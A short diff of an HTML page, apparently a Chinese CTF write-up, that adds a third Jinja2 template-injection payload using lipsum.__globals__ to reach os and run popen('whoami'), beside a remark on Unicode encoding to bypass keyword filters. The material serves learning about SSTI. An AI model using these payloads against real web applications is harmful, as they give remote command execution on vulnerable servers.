@@ -659,6 +659,7 @@ flag = f.read()
 <p>然后用他直接调用__globals__发现可以直接执行os命令，测了一下发现__builtins__也可以用，又学到了一种新方法，只能说师傅们tql</p>
 <pre><code class="python">&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;
 &#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;
+&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;
 </code></pre>
 <p>回到正题，这里使用了Unicode编码绕过关键字，下面两行是等价的</p>
 <pre><code class="python">&#123;&#123;()|attr("__class__")&#125;&#125;
